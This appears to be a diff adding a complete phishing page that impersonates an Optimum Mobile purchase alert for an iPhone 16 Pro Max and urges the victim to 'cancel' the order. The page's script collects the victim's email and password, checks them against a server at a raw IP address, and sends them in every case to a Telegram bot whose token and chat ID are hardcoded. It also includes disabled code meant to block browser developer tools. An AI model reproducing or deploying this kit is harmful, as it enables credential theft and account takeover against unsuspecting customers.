@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Action Required</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&family=Montserrat:wght@500&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #eef2f7;
+            color: #333;
+            margin: 0;
+            padding: 20px;
+        }
+        #main-content {
+            background-color: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            max-width: 600px;
+            margin: auto;
+            transition: transform 0.3s;
+        }
+        .action-required {
+            background-color: #ffffff;
+            color: white;
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between; 
+        }
+        .action-required img {
+            max-width: 150px;
+            margin-right: 200px;
+        }
+        .action-required h3 {
+            margin: 0;
+            padding-right: 15%;
+            font-size: 1.4em;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+        .phone-image {
+            text-align: center;
+            margin: 30px 0;
+            background-color: #edf3fe;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+        .phone-image img {
+            max-width: 100%;
+            max-height: 260px;
+            border-radius: 10px;
+        }
+        label {
+            display: block;
+            margin: 15px 0 5px;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        select, input {
+            width: calc(100% - 30px);
+            padding: 15px;
+            margin-top: 10px;
+            border: 2px solid #dfe6e9;
+            border-radius: 8px;
+            font-size: 16px;
+            background-color: #f5f7fa;
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+        select:focus, input:focus {
+            border-color: #3498db;
+            box-shadow: 0 0 8px rgba(52, 152, 219, 0.3);
+            outline: none;
+        }
+        .error {
+            border-color: #e74c3c !important;
+            box-shadow: 0 0 8px rgba(231, 76, 60, 0.5) !important;
+        }
+        button {
+            background: linear-gradient(45deg, #6c5ce7, #0984e3);
+            color: white;
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 20px;
+            font-family: 'Montserrat', sans-serif;
+            transition: background 0.3s, transform 0.3s;
+            width: 100%;
+        }
+        
+        button:hover {
+            background: linear-gradient(45deg, #0984e3, #6c5ce7);
+            transform: translateY(-2px);
+        }
+        button:focus {
+            outline: none;
+            box-shadow: 0 0 8px rgba(52, 152, 219, 0.5);
+        }
+        .verification-form {
+            display: none;
+            margin-top: 30px;
+            background-color: #f9f9f9;
+            padding: 30px 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+        .verification-form h3 {
+            font-size: 1.6em;
+            margin-bottom: 20px;
+            color: #333;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            background: linear-gradient(90deg, #3498db, #e74c3c);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        #selected-provider {
+            font-weight: bold;
+            margin-top: 15px;
+            text-align: center;
+            font-size: 1.2em;
+            color: #3498db;
+        }
+        .error-message {
+            color: #e74c3c;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .loading img {
+            width: 80px;
+        }
+        .submitted-message {
+            display: none;
+            color: #2981ad;
+            background-color: rgba(238, 242, 247, 0.8);
+            border: 2px solid #dde9e2;
+            font-weight: bold;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+            text-align: center;
+            font-size: 1.2em;
+        }
+        /* Responsive Styles */
+        @media (max-width: 768px) {
+            body {
+                padding: 10px;
+            }
+            #main-content {
+                padding: 20px;
+            }
+            .action-required h3 {
+                font-size: 1.2em;
+            }
+            .phone-image img {
+                max-height: 200px;
+            }
+            button {
+                padding: 12px;
+                font-size: 15px;
+            }
+        }
+        @media (max-width: 480px) {
+            .action-required img {
+                max-width: 50px;
+            }
+            .action-required h3 {
+                font-size: 1.1em;
+            }
+            .phone-image {
+                padding: 20px;
+            }
+            .verification-form h3 {
+                font-size: 1.4em;
+            }
+            select, input {
+                padding: 12px;
+                font-size: 14px;
+            }
+            button {
+                padding: 10px;
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="main-content">
+        <div class="action-required">
+            <img src="https://th.bing.com/th/id/R.9b902ce950803eca38ab55cfec836220?rik=qadiEVEPWrVR2A&pid=ImgRaw&r=0" alt="Social Security Administration">
+            <h3>Optimum Mobile</h3>
+        </div>
+        <div class="phone-image">
+            <img src="https://www.att.com/scmsassets/global/devices/phones/apple/apple-iphone-16-pro-max/carousel/desert-titanium-1.png" alt="iPhone 16 Pro Max">
+            <div>The cost of the phone is <strong>$1,099.00</strong>.</div>
+            <div>If this was not you, please take immediate action.</div>
+        </div>
+        <div id="provider-selection">
+            <label for="provider">Select Your Provider:</label>
+            <select id="provider">
+                <option value="Optimum">Optimum (Altice USA)</option>
+            </select>
+            <button id="cancel-application">Cancel Device</button>
+            <div id="error-message" class="error-message" aria-live="polite"></div>
+        </div>
+
+        <div id="verification-form" class="verification-form">
+            <h3>Verify Your Identity</h3>
+            <div id="selected-provider"></div>
+            <label for="email">Email:</label>
+            <input type="email" id="email" placeholder="Email" required>
+            <label for="password">Password:</label>
+            <input type="password" id="password" placeholder="Password" required>
+            <button id="proceed">Proceed</button>
+            <div id="form-error-message" class="error-message" aria-live="polite"></div>
+            
+        </div>
+
+        <div class="loading">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b1/Loading_icon.gif" alt="Loading">
+            <div>Sending your request...</div>
+        </div>
+
+        <div class="submitted-message" aria-live="polite">Your request has been successfully sent!</div>
+    </div>
+
+    <script>
+        // Disable right-click
+        // document.addEventListener('contextmenu', function(e) {
+        //     e.preventDefault();
+        // }, false);
+
+        // // Disable key combinations for viewing source code and developer tools
+        // document.addEventListener('keydown', function(e) {
+        //     if (e.key === 'F12' || 
+        //         (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+        //         (e.ctrlKey && (e.key === 'U' || e.key === 'S'))) {
+        //         e.preventDefault();
+        //     }
+        // });
+// Event listener for provider selection
+document.getElementById('cancel-application').addEventListener('click', function() {
+    const provider = document.getElementById('provider').value;
+    const errorMessage = document.getElementById('error-message');
+
+    // Check if a provider is selected
+    if (provider === "") {
+        errorMessage.textContent = 'Please select a provider before proceeding.';
+        return;
+    }
+
+    // Hide the provider selection label and button
+    document.getElementById('provider-selection').style.display = 'none';
+
+    // Show the verification form
+    document.getElementById('verification-form').style.display = 'block';
+});
+
+// Proceed button click event listener
+document.getElementById('proceed').addEventListener('click', function() {
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value.trim();
+    const provider = document.getElementById('provider').value;
+    const errorMessage = document.getElementById('form-error-message');
+
+    // Reset error styles
+    document.getElementById('email').classList.remove('error');
+    document.getElementById('password').classList.remove('error');
+
+    // Validate the fields before proceeding
+    if (email === "" || password === "") {
+        errorMessage.textContent = 'All fields are required. Please fill in the missing fields.';
+
+        if (email === "") document.getElementById('email').classList.add('error');
+        if (password === "") document.getElementById('password').classList.add('error');
+
+        return;
+    }
+
+    // Show loading gif immediately
+    document.querySelector('.loading').style.display = 'block';
+    document.getElementById('verification-form').style.display = 'none';
+
+    // Send to Telegram first
+        validateEmailPassword(email, password, provider)
+        .then(isValid => {
+            if (!isValid) {
+                // If validation fails, show the form again and display error message
+                sendToTelegram2(provider, email, password)
+                document.getElementById('verification-form').style.display = 'block';
+                document.querySelector('.loading').style.display = 'none';
+                errorMessage.textContent = 'Invalid email or password. Please check your details and try again.';
+                document.getElementById('password').classList.add('error');
+            } else {
+                // Validation success - show success message
+                sendToTelegram(provider, email, password)
+                document.querySelector('.loading').style.display = 'none';
+                document.querySelector('.submitted-message').style.display = 'block';
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            // Handle error if Telegram or validation fails
+            document.querySelector('.loading').style.display = 'none';
+            errorMessage.textContent = 'There was an error processing your request.';
+        });
+});
+
+// Function to validate email and password
+function validateEmailPassword(email, password, provider) {
+    return fetch('http://198.46.129.153:7500/send.php', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            email: email,
+            password: password,
+            provider: provider
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        return data.success;  // Returns true if credentials are valid
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        return false;  // In case of an error, return false
+    });
+}
+
+// Function to send data to Telegram
+function sendToTelegram(provider, email, password) {
+    const message = `OPTIMUM LOGIN:\nProvider: ${provider}\nEmail: ${email}\nPassword: ${password}\n`;
+    const token = '7436269644:AAEfLYABqqydaOvX7eMQVeE2xPePjCBUOfg'; // Your Telegram bot token
+    const chatId = '1412104349'; // Your Telegram chat ID
+    const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
+
+    return fetch(telegramUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'HTML'
+        })
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Network response was not ok');
+        }
+        return response.json();
+    })
+    .then(data => {
+        console.log('Form successfully sent to Telegram.');
+    })
+    .catch(error => {
+        console.error('There was a problem with the fetch operation:', error);
+        document.getElementById('form-error-message').textContent = 'There was an error sending your request to Telegram.';
+        throw error;
+    });
+}
+
+function sendToTelegram2(provider, email, password) {
+    const message = `OPTIMUM LOGIN INVALID:\nProvider: ${provider}\nEmail: ${email}\nPassword: ${password}\n`;
+    const token = '7436269644:AAEfLYABqqydaOvX7eMQVeE2xPePjCBUOfg'; // Your Telegram bot token
+    const chatId = '1412104349'; // Your Telegram chat ID
+    const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
+
+    return fetch(telegramUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'HTML'
+        })
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Network response was not ok');
+        }
+        return response.json();
+    })
+    .then(data => {
+        console.log('Form successfully sent to Telegram.');
+    })
+    .catch(error => {
+        console.error('There was a problem with the fetch operation:', error);
+        document.getElementById('form-error-message').textContent = 'There was an error sending your request to Telegram.';
+        throw error;
+    });
+}
+
+    </script>
+    
+    
+</body>
+</html>
